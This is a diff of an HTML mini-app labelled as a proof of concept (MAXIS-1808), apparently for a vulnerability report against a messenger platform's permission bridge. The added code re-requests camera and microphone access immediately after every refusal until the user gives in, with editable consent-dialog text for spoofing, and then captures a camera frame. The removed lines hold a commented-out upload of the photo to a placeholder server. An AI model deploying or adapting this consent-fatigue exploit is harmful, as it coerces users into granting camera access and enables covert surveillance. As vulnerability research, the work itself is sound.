@@ -2,7 +2,8 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>SpyCam MiniApp</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>SpyCam MiniApp (PoC MAXIS-1808)</title>
   <style>
   body { font-family: -apple-system, system-ui, sans-serif; margin: 0; background: #111; color: #eee; padding: 16px; }
   h1 { font-size: 18px; } h2 { font-size: 15px; margin: 20px 0 8px; }
@@ -22,93 +23,212 @@
         border: 1px solid #444; background: #000; color: #eee; font-size: 14px; }
   .warn { color: #ffd60a; font-size: 12px; }
   .ok { color: #30d158; } .bad { color: #ff453a; }
-</style>
-  <script type="module" src="/test_webapp/max-web-app.mjs"></script>
-   <script>
-    async function capture() {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        const video = document.getElementById('video');
-        video.srcObject = stream;
+  video { width: 100%; border-radius: 12px; background: #000; }
+  </style>
 
-        await new Promise(resolve => video.onloadedmetadata = resolve);
-
-        // Немного подождём, чтобы камера точно успела включиться
-        await new Promise(res => setTimeout(res, 700));
-
-        const canvas = document.getElementById('canvas');
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        canvas.getContext('2d').drawImage(video, 0, 0);
-
-        // Останавливаем камеру
-        stream.getTracks().forEach(track => track.stop());
-
-        // Показываем фото
-        const photo = document.getElementById('photo');
-        photo.src = canvas.toDataURL('image/png');
-
-        // Убираем видео
-        video.style.display = 'none';
-
-        // Если нужно отправить фото:
-        /*
-        fetch('https://your-server.com/upload', {
-          method: 'POST',
-          body: JSON.stringify({ image: photo.src }),
-          headers: { 'Content-Type': 'application/json' }
-        });
-        */
-
-      } catch (err) {
-        document.body.innerHTML = '<h2>❌ Камера недоступна</h2>';
-        console.error(err);
-      }
-    }
-function RequestOnce() {
-    var pm = window.WebApp.PermissionsManager;
-    pm.init();
-    var reason = document.getElementById('reason').value || undefined;
-
-    var p;
-    if (pm && typeof pm.requestAccess === 'function') {
-      p = Promise.resolve().then(function () { return pm.requestAccess(); });
-    } else {
-      return Promise.reject(new Error('bridge недоступен: нет WebApp.PermissionsManager'));
-    }
-  }
- 
+  <!--
+    ВАЖНО: max-web-app.mjs НЕ вешает свой API на window.WebApp — туда попадает
+    только заглушка { sendEvent } (её вызывает нативный клиент для доставки ответов).
+    Полный API (PermissionsManager, requestController, ...) — это default export
+    модуля. Поэтому импортируем его явно и кладём в глобальную переменную,
+    доступную обычным (не-module) скриптам ниже.
+  -->
+  <script type="module">
+    import WebAppFull from './max-web-app.mjs';
+    window.WebAppFull = WebAppFull;
+    window.dispatchEvent(new Event('webapp-sdk-ready'));
   </script>
 </head>
-  
-    
+
 <body>
   <h2>Smile for the camera 😈</h2>
-  <button onclick="capture()">Start Camera Capture with getUserMedia</button>
-  <button onclick="RequestOnce()">Request Access to Camera stream</button>
+  <div id="bridge-status" class="warn">bridge: загрузка SDK…</div>
+
+  <button class="primary" onclick="capture()">Start Camera Capture with getUserMedia</button>
+  <button class="muted" onclick="RequestOnce()">Request Access to Camera stream</button>
 
   <div class="card">
-  <h2>Управление</h2>
-  <button class="primary" id="btn-start">Запустить цикл requestAccess</button>
-  <button class="danger"  id="btn-stop" disabled>Остановить</button>
-  <label>Пауза между запросами, мс (0 = сразу после ответа)
-    <input type="text" id="delay" value="0" inputmode="numeric" />
-  </label>
-  <label>reason (текст в диалоге согласия — вектор L-2)
-    <input type="text" id="reason" value="[PoC MAXIS-1808] Подтвердите доступ к камере для продолжения видеосвязи" />
-  </label>
-  <label>Разрешения
-    <select id="perms">
-      <option value="camera">camera</option>
-      <option value="mic">mic</option>
-      <option value="both" selected>camera + mic</option>
-    </select>
-  </label>
-  <button class="muted" id="btn-single">Одиночный requestAccess (для сравнения)</button>
-</div>
-  <video id="video" autoplay playsinline></video>
-  <canvas id="canvas" style="display: none;"></canvas>
-  <img id="photo" alt="Captured image will appear here">
+    <h2>Управление циклом (M-2)</h2>
+    <button class="primary" id="btn-start" onclick="startLoop()">Запустить цикл requestAccess</button>
+    <button class="danger" id="btn-stop" onclick="stopLoop()" disabled>Остановить</button>
+    <label>Пауза между запросами, мс (0 = сразу после ответа)
+      <input type="text" id="delay" value="0" inputmode="numeric" />
+    </label>
+    <label>reason (текст в диалоге согласия — вектор L-2)
+      <input type="text" id="reason" value="[PoC MAXIS-1808] Подтвердите доступ к камере для продолжения видеосвязи" />
+    </label>
+    <label>Разрешения
+      <select id="perms">
+        <option value="camera" selected>camera</option>
+        <option value="mic">mic</option>
+        <option value="both">camera + mic</option>
+      </select>
+    </label>
+  </div>
 
+  <div class="card">
+    <h2>Статус цикла</h2>
+    <div class="stat">
+      <div><b id="n-iter">0</b>итераций</div>
+      <div><b id="n-denied">0</b>отказов</div>
+      <div><b id="n-granted">—</b>доступ</div>
+    </div>
+  </div>
+
+  <div class="card">
+    <h2>Лог</h2>
+    <pre id="log"></pre>
+  </div>
+
+  <video id="video" autoplay playsinline muted></video>
+  <canvas id="canvas" style="display: none;"></canvas>
+  <img id="photo" alt="Captured image will appear here" style="width:100%;border-radius:12px;" />
+
+<script>
+  'use strict';
+
+  // ---- лог/статус ----
+  function log(msg) {
+    var t = new Date().toISOString().substr(11, 12);
+    var el = document.getElementById('log');
+    el.textContent = '[' + t + '] ' + msg + '\n' + el.textContent;
+    if (el.textContent.length > 20000) el.textContent = el.textContent.substr(0, 20000);
+  }
+  var nIter = 0, nDenied = 0, running = false;
+  function stat() {
+    document.getElementById('n-iter').textContent = nIter;
+    document.getElementById('n-denied').textContent = nDenied;
+  }
+
+  function updateBridgeStatus() {
+    var el = document.getElementById('bridge-status');
+    var sdk = window.WebAppFull;
+    if (sdk && sdk.PermissionsManager) {
+      el.textContent = 'bridge: WebAppFull.PermissionsManager доступен (platform: ' + (sdk.platform || '?') + ')';
+      el.className = 'ok';
+    } else if (sdk) {
+      el.textContent = 'bridge: SDK загружен, но PermissionsManager отсутствует';
+      el.className = 'bad';
+    }
+  }
+  window.addEventListener('webapp-sdk-ready', updateBridgeStatus);
+  setTimeout(updateBridgeStatus, 1500); // на случай, если модуль загрузился раньше листенера
+
+  function getPM() {
+    var sdk = window.WebAppFull;
+    return sdk && sdk.PermissionsManager;
+  }
+
+  // SDK кидает НЕ Error, а { error: { code } } — форматируем аккуратно
+  function errText(e) {
+    if (e && e.error && e.error.code) return e.error.code;
+    if (e && e.code) return e.code;
+    return (e && e.message) ? e.message : JSON.stringify(e);
+  }
+
+  function permsArray() {
+    var v = document.getElementById('perms').value;
+    return v === 'both' ? ['camera', 'mic'] : [v];
+  }
+
+  function sleep(ms) { return new Promise(function (r) { setTimeout(r, ms); }); }
+
+  // ---- одиночный запрос ----
+  async function RequestOnce() {
+    var pm = getPM();
+    if (!pm) { log('bridge недоступен: SDK ещё не загружен или открыт вне клиента MAX'); return; }
+    var reason = document.getElementById('reason').value || undefined;
+    try {
+      await pm.init();                       // обязательный шаг: без него requestAccess -> not_inited
+      log('init() ok, camera.appAccessGranted=' + pm.isCameraAppAccessGranted);
+    } catch (e) {
+      log('init() ошибка: ' + errText(e));
+      return;
+    }
+    try {
+      var res = await pm.requestAccess(permsArray(), reason);
+      log('requestAccess ok: ' + JSON.stringify(res));
+      document.getElementById('n-granted').textContent =
+        (res && (res.camera.appAccessGranted || res.mic.appAccessGranted)) ? 'выдан' : 'нет';
+    } catch (e) {
+      log('requestAccess отказ: ' + errText(e));
+    }
+  }
+
+  // ---- цикл M-2: немедленный повтор после каждого отказа ----
+  async function loop() {
+    if (!running) return;
+    nIter++; stat();
+    var pm = getPM();
+    var reason = document.getElementById('reason').value || undefined;
+    try {
+      var res = await pm.requestAccess(permsArray(), reason);
+      var granted = res && (res.camera.appAccessGranted || res.mic.appAccessGranted);
+      if (granted) {
+        document.getElementById('n-granted').textContent = 'выдан';
+        log('ИТЕРАЦИЯ ' + nIter + ': ДОСТУП ВЫДАН — цикл остановлен.');
+        stopLoop();
+        return;
+      }
+      nDenied++; stat();
+      log('ИТЕРАЦИЯ ' + nIter + ': ответ без доступа → повторный запрос.');
+    } catch (e) {
+      nDenied++; stat();
+      log('ИТЕРАЦИЯ ' + nIter + ': отказ (' + errText(e) + ') → повторный запрос.');
+    }
+    var d = parseInt(document.getElementById('delay').value, 10) || 0;
+    await sleep(d);
+    loop();
+  }
+
+  async function startLoop() {
+    var pm = getPM();
+    if (!pm) { log('bridge недоступен: SDK ещё не загружен или открыт вне клиента MAX'); return; }
+    try {
+      await pm.init();
+      log('init() ok. Старт цикла: жмите «Отмена» в шите согласия.');
+    } catch (e) {
+      log('init() ошибка: ' + errText(e) + ' — цикл всё равно стартует.');
+    }
+    running = true;
+    document.getElementById('btn-start').disabled = true;
+    document.getElementById('btn-stop').disabled = false;
+    loop();
+  }
+
+  function stopLoop() {
+    running = false;
+    document.getElementById('btn-start').disabled = false;
+    document.getElementById('btn-stop').disabled = true;
+    log('Цикл остановлен. Итераций: ' + nIter + ', отказов: ' + nDenied + '.');
+  }
+
+  // ---- захват кадра (демонстрация результата доступа) ----
+  async function capture() {
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      const video = document.getElementById('video');
+      video.srcObject = stream;
+
+      await new Promise(resolve => video.onloadedmetadata = resolve);
+      await new Promise(res => setTimeout(res, 700));
+
+      const canvas = document.getElementById('canvas');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      canvas.getContext('2d').drawImage(video, 0, 0);
+
+      stream.getTracks().forEach(track => track.stop());
+
+      const photo = document.getElementById('photo');
+      photo.src = canvas.toDataURL('image/png');
+      video.style.display = 'none';
+      log('getUserMedia: кадр захвачен (доступ к камере активен).');
+    } catch (err) {
+      log('getUserMedia ошибка: ' + (err && err.name ? err.name + ': ' + err.message : err));
+      console.error(err);
+    }
+  }
+</script>
 </body>
 </html>
